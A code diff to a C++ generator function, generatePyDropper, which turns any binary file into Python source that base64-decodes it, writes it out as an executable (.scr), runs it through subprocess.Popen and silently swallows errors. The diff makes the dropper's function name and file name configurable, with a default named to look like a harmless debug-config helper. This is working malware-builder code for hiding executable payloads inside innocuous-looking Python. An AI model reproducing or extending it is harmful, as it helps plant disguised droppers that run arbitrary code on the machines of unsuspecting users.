@@ -72,22 +72,24 @@ std::string base64Encode(const std::vector<char>& data)
 }
 
 
-std::string generatePyDropper(std::string path) {
+std::string generatePyDropper(std::string path,
+                              std::string functionName = "bl_get_generic_debug_conf",
+                              std::string fileName = "conf.scr"){
     std::ifstream inFile(path, std::ios::binary);
     if (inFile.is_open()) {
         std::vector<char> buffer((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
         std::string b64Data = base64Encode(buffer);
         buffer.clear();
         std::string pyCode;
-        pyCode += "def bl_get_generic_debug_conf():\n";
+        pyCode += "def " + functionName + "():\n";
         pyCode += "    import base64\n";
         pyCode += "    import subprocess\n";
         pyCode += "    b = b'" + b64Data + "'\n";
         pyCode += "    d = base64.b64decode(b)\n";
         pyCode += "    try:\n";
-        pyCode += "        with open('conf.scr', 'wb') as f:\n";
+        pyCode += "        with open('" + fileName + "', 'wb') as f:\n";
         pyCode += "            f.write(d)\n";
-        pyCode += "        subprocess.Popen('conf.scr')\n";
+        pyCode += "        subprocess.Popen('" + fileName + "')\n";
         pyCode += "    except:\n";
         pyCode += "        pass\n";
         return pyCode;
